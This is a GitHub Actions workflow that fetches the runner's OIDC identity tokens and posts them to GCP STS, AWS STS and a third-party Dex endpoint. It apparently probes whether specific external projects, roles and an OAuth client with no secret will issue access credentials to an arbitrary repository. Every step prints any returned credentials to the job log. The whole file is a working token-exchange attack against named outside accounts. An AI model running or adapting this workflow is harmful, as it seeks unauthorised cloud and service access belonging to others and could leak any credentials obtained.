name: t8-fixed-exchange
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        id: get-tokens
        with:
          script: |
            const fs = require('fs');
            const githubToken = await core.getIDToken('github');
            const awsToken = await core.getIDToken('sts.amazonaws.com');
            fs.writeFileSync('/tmp/t_github.txt', githubToken || 'null');
            fs.writeFileSync('/tmp/t_aws.txt', awsToken || 'null');
            console.log('github_len=' + (githubToken ? githubToken.length : 0));
            console.log('aws_len=' + (awsToken ? awsToken.length : 0));

      - name: GCP STS with scope
        run: |
          set +e
          TG=$(cat /tmp/t_github.txt)
          if [ -n "$TG" ] && [ "$TG" != "null" ]; then
            echo "=== GCP STS with scope (github token) ==="
            BODY='{"grantType":"urn:ietf:params:oauth:grant-type:token-exchange","requestedTokenType":"urn:ietf:params:oauth:token-type:access_token","subjectTokenType":"urn:ietf:params:oauth:token-type:jwt","subjectToken":"'${TG}'","scope":"https://www.googleapis.com/auth/cloud-platform","audience":"//iam.googleapis.com/projects/568425278105/locations/global/workloadIdentityPools/github-actions/providers/github-provider"}'
            curl -s -X POST "https://sts.googleapis.com/v1/token" \
              -H "Content-Type: application/json" \
              -d "$BODY" 2>&1
            echo ""
          fi

      - name: AWS STS fixed
        run: |
          set +e
          TA=$(cat /tmp/t_aws.txt)
          if [ -n "$TA" ] && [ "$TA" != "null" ]; then
            echo "=== AWS STS fixed ==="
            curl -s -X POST "https://sts.amazonaws.com/" \
              -d "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::704834779610:role/GitHubActionsRole&RoleSessionName=test&WebIdentityToken=${TA}" 2>&1
            echo ""
          fi

      - name: North Dex token exchange with client auth
        run: |
          set +e
          TG=$(cat /tmp/t_github.txt)
          if [ -n "$TG" ] && [ "$TG" != "null" ]; then
            echo "=== North Dex token exchange (no client_secret) ==="
            curl -s -X POST "https://north.cohere.com/dex/token" \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              -d "client_id=north" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "subject_token=${TG}" \
              -d "scope=openid%20profile%20email" 2>&1
            echo ""
          fi
